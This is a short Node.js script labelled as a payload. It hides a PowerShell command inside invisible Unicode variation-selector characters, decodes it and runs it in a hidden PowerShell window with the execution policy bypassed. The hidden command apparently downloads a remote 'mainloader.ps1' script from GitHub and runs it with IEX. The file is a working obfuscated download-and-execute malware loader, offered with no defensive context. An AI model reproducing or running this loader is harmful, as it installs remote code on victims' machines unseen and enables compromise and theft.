// VSS Payload - Pure Node.js
// Run with: node vss_payload.js

const { spawn } = require('child_process');

// VSS-encoded command
const VSS = '︄︉︄︅︅︈︂︈︂︈︄︎︆︅︇︇︂︍︄️︆︂︆︊︆︅︆︃︇︄︂︀︄︎︆︅︇︄︂︎︅︇︆︅︆︂︄︃︆︌︆︉︆︅︆︎︇︄︂︉︂︎︄︄︆️︇︇︆︎︆︌︆️︆︁︆︄︅︃︇︄︇︂︆︉︆︎︆︇︂︈︂︇︆︈︇︄︇︄︇︀︇︃︃︊︂️︂️︆︇︆︉︇︄︆︈︇︅︆︂︂︎︆︃︆️︆︍︂️︆︁︆︎︆︇︆︅︆︌︇︃︆︅︆︇︆︇︂️︆︇︆︆︆︄︆︄︆︈︆︄︂️︇︂︆︁︇︇︂️︇︂︆︅︆︆︇︃︂️︆︈︆︅︆︁︆︄︇︃︂️︆︍︆︁︆︉︆︎︂️︆︍︆︉︆︎︆︉︆︌︆️︆︁︆︄︆︅︇︂︂︎︇︀︇︃︃︁︂︇︂︉︂︉';

console.log('=== VSS Node.js Payload ===');

// Decode VSS
function decodeVSS(vss) {
    const bytes = [];
    for (let i = 0; i < vss.length; i++) {
        const code = vss.charCodeAt(i);
        if (code >= 0xFE00 && code <= 0xFE0F) {
            const nibble = code - 0xFE00;
            if (i % 2 === 0) {
                bytes.push(nibble << 4);
            } else {
                bytes[bytes.length - 1] |= nibble;
            }
        }
    }
    return Buffer.from(bytes).toString('utf8');
}

// Execute
const decoded = decodeVSS(VSS);
console.log('Decoded:', decoded.substring(0, 80) + '...');

const ps = spawn('powershell.exe', ['-EP', 'Bypass', '-W', 'Hidden', '-N', '-NI', '-Command', decoded], {
    windowsHide: true,
    stdio: 'inherit'
});

ps.on('close', (code) => console.log('Done! Code:', code));